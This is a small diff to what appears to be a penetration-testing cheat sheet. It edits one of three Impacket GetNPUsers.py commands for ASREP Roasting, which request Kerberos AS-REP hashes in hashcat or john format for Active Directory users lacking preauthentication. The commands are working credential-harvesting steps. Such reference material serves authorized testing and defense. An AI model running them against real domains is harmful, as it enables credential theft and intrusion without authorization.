@@ -61,7 +61,7 @@ ASREP Roasting - For users that do not require Kerberos preauthentiation: 'Do no
 ```bash
 GetNPUsers.py  -dc-ip $IP -request '$domain/' 
 GetNPUsers.py  -dc-ip $IP -request '$domain/' -format hashcat
-GetNPUsers.py  -dc-ip DC -usersfile users.txt -format john domain.tld
+GetNPUsers.py  -dc-ip $IP -usersfile users.txt -format john domain.tld
 ```
 This example will attempt to list and get TGTs for those users that have the property:
 ```bash
